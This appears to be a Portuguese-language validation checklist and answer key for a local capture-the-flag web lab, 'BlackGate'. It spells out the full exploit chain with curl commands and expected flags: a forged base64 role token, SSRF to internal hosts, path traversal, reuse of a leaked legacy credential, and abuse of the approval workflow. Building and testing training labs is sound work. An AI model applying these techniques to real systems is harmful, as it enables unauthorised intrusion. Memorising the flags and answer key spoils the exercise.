# Validacao - Lab 05 BlackGate - Fase 9

## Escopo

```text
http://localhost:8096
```

## Subir o lab

```bash
cd lab-05-blackgate
docker compose up --build
```

Em outro terminal:

```bash
docker compose ps
```

Resultado esperado:

- servico `blackgate` em execucao;
- porta `8096:3000`.

## Manual validation without curl

Esta secao valida a experiencia publica e a visibilidade por role usando navegador e, se necessario, proxy/repeater. Ela nao valida a cadeia completa de flags; a cadeia tecnica completa fica na secao de terminal.

### Manual validation checklist

1. Acesse `http://localhost:8096`.
2. Verifique que a tela de login expoe somente a credencial inicial:

```text
guest / guest123
```

3. Entre como `guest`.
4. Confirme que o menu mostra somente:

```text
Dashboard
Tickets
Assets
Logout
```

5. Abra Dashboard, Tickets e Assets.
6. Confirme que a UI de `guest` nao mostra flags, payloads finais, credenciais internas, endpoints internos finais, links de API em Tickets ou links de API em Assets.
7. Tente acessar diretamente `/context`, `/gateway`, `/legacy` e `/files-vault` como `guest`.
8. Confirme que essas rotas retornam acesso restrito para a conta inicial.
9. Entre como `analyst` em ambiente de validacao interna.
10. Confirme que o menu mostra Dashboard, Tickets, Assets, Context e Logout.
11. Abra Context como `analyst` e confirme que a pagina e limitada, sem header operacional, payload, endpoint ofensivo ou instrucao de exploracao.
12. Entre como `operator` em ambiente de validacao interna.
13. Confirme que o menu mostra Dashboard, Context, Gateway, Legacy, Files Vault, Tickets, Assets, Health e Logout.
14. Navegue pelas telas de operator e confirme que elas continuam profissionais e sem flags renderizadas diretamente na UI.
15. Verifique `robots.txt`, sitemap/rotas publicas e client config: eles podem ajudar no reconhecimento, mas nao devem entregar endpoint final, payload final ou flag final.

### Ausencia de spoilers em superficie publica

Validar manualmente que README, Student Guide, tela de login, dashboard de guest, tickets de guest, assets de guest, JS publico e configuracao publica nao entregam:

- flags;
- credenciais internas;
- payload final;
- endpoint final;
- identificadores finais de review/reconciliation;
- comando ou request pronto que finalize o boss.

## Terminal validation checklist

## Health e recon publico

```bash
curl -i http://localhost:8096/health
curl -i http://localhost:8096/api/version
curl -i http://localhost:8096/api/client-config
curl -i http://localhost:8096/api/routes
curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
```

Resultado esperado:

- `/health` retorna `1.8.0-phase9`;
- `/api/version` retorna build `bg-phase9-final-approval`;
- client-config nao contem flag, payload ou endpoint interno de approval;
- `/api/routes` nao lista rotas internas de reports, worker ou approval;
- debug nao entrega endpoint final nem combinacao.

## Login e token operator

```bash
rm -f /tmp/bg-cookie.txt

curl -i -c /tmp/bg-cookie.txt \
  -d "username=guest&password=guest123" \
  -X POST http://localhost:8096/login

TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

## Fases antigas ainda funcionais

```bash
curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  http://localhost:8096/api/operator/briefing
```

Esperado:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

```bash
CORE_META=$(node -e 'console.log(encodeURIComponent("http://api-core.internal/metadata"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CORE_META"
```

Esperado:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

```bash
PHASE5_FILE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$PHASE5_FILE"
```

Esperado:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## Arquivos restritos da Fase 9

```bash
FINAL_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/final-review-notes.txt"))')
APPROVAL_RECON=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/approval-reconciliation.txt"))')
APPROVAL_POLICY=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/admin-approval-policy.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_NOTES"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_RECON"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_POLICY"
```

Resultado esperado:

- leitura funciona via bypass controlado `/public/../restricted/...`;
- nenhuma resposta contem a flag final.

Path direto deve falhar:

```bash
DIRECT_FINAL_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/restricted/final-review-notes.txt"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$DIRECT_FINAL_NOTES"
```

Resultado esperado:

- HTTP 403;
- `forbidden_path`.

## Legacy auth e Fase 6

```bash
LEGACY_AUTH=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_AUTH"
```

Resultado esperado:

```text
bg6-legacy-session-migration
```

```bash
LEGACY_MAINT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_MAINT"
```

Resultado esperado:

```text
FLAG{blackgate_legacy_credential_reuse_phase6}
```

## Criar job da Fase 7

```bash
CREATE_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=queue-only"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_JOB"
```

Resultado esperado:

```text
FLAG{blackgate_report_workflow_abuse_phase7}
```

Decoy `migration-check` ainda sem flag:

```bash
CREATE_NORMAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary&queue=migration-report-queue&mode=dry-run"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_NORMAL"
```

Esperado: `created: true`, sem flags da Fase 7, 8 ou 9.

## Processar worker da Fase 8

```bash
WORKER_FLAG=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/worker/process?session=bg6-legacy-session-migration&job=bg7-job-worker-diagnostics&action=trace:internal:queue&review=1"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_FLAG"
```

Resultado esperado:

```text
FLAG{blackgate_worker_processing_abuse_phase8}
```

Tambem deve conter:

- `review_id: BG-REV-9041`;
- `trace_marker: qtrace-9041`;
- `queue_ref: maintenance-worker:bg7-job-worker-diagnostics`;
- `approval.state: pending-admin`.

## Approval sem session e session errada

```bash
APPROVAL_NO_SESSION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status"))')
APPROVAL_BAD_SESSION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status?session=bad"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_NO_SESSION"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_BAD_SESSION"
```

Resultado esperado:

- `legacy_session_required`;
- `invalid_legacy_session`.

## Approval status e audit

```bash
APPROVAL_STATUS_GENERIC=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status?session=bg6-legacy-session-migration"))')
APPROVAL_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/status?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')
APPROVAL_AUDIT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/audit?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_STATUS_GENERIC"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_STATUS"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$APPROVAL_AUDIT"
```

Resultado esperado:

- sem review_id retorna estado generico;
- review correto retorna `pending-admin` e `finalizable: false`;
- audit mostra eventos limitados sem flag final.

## Reconcile decoys

```bash
RECON_MISSING=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')
RECON_BAD_REVIEW=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-0000&trace_marker=qtrace-9041&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')
RECON_BAD_TRACE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-0000&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')
RECON_BAD_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-9041&queue_ref=wrong"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_MISSING"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_REVIEW"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_TRACE"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECON_BAD_QUEUE"
```

Resultados esperados:

- `reconciliation_incomplete`;
- `review_not_found`;
- `invalid_trace_marker`;
- `invalid_queue_ref`.

## Reconcile correto

```bash
RECONCILE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/reconcile?session=bg6-legacy-session-migration&review_id=BG-REV-9041&trace_marker=qtrace-9041&queue_ref=maintenance-worker:bg7-job-worker-diagnostics"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$RECONCILE"
```

Resultado esperado:

```text
bg9-reconciled-BG-REV-9041
```

## Finalize decoys

```bash
FINAL_MISSING=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041"))')
FINAL_ADMIN=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=admin"))')
FINAL_OPERATOR=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=operator"))')
FINAL_BAD_TOKEN=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bad&finalizer=maintenance"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_MISSING"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_ADMIN"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_OPERATOR"

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL_BAD_TOKEN"
```

Resultados esperados:

- `finalization_incomplete`;
- `public_admin_rejected`;
- `operator_finalizer_rejected`;
- `invalid_reconciliation_token`.

## Final correto

```bash
FINAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/approval/finalize?session=bg6-legacy-session-migration&review_id=BG-REV-9041&reconciliation_token=bg9-reconciled-BG-REV-9041&finalizer=maintenance"))')

curl -i -b /tmp/bg-cookie.txt \
  -H "X-BG-Context: $TOKEN" \
  "http://localhost:8096/api/operator/gateway-fetch?url=$FINAL"
```

Resultado esperado:

```text
FLAG{blackgate_final_admin_approval_boss_chain}
```

Tambem deve retornar:

- `state: finalized`;
- `finalizer: maintenance`;
- `complete: true`.

## Visibilidade autenticada no navegador

Apos login com a conta inicial, validar que o menu publico mostra apenas:

```text
/dashboard
/tickets
/assets
/logout
```

Para a conta inicial, acessos diretos a `/context`, `/gateway`, `/legacy` e `/files-vault` devem retornar acesso restrito.

Em validacao interna de roles, a visibilidade esperada e:

```text
analyst: /dashboard, /tickets, /assets, /context, /logout
operator: /dashboard, /context, /gateway, /legacy, /files-vault, /tickets, /assets, /health, /logout
```

## Checks estaticos

```bash
grep -R "809[0-5]" -n . --exclude-dir=node_modules --exclude-dir=.git || true
grep -R "FLAG{blackgate_final_admin_approval_boss_chain}" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "BG-REV-9041\\|qtrace-9041\\|bg9-reconciled-BG-REV-9041" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "/approval/finalize\\|/approval/reconcile\\|/approval/status\\|/approval/audit" -n README.md STUDENT-GUIDE.md src/public src/views src/routes/api.js src/routes/debug.js src/routes/operator.js || true
grep -R "child_process\\|exec(\\|spawn(" -n src || true
```

Resultado esperado:

- nenhuma ocorrencia de porta antiga;
- flag final nao aparece em README, Student Guide, JS publico, views ou rotas publicas;
- review id, trace marker e token nao aparecem em README, Student Guide, JS publico, views ou rotas publicas;
- endpoints sensiveis de approval nao aparecem nas superficies publicas;
- nenhum uso de command execution real.

## Final release validation checklist

- Docker build OK.
- Port 8096 OK.
- Public endpoints OK.
- Sensitive routes hidden from route map.
- Client config sanitized.
- Debug output sanitized.
- Flags restricted to spoiler docs/internal code.
- Full chain validated.
- Decoys validated.
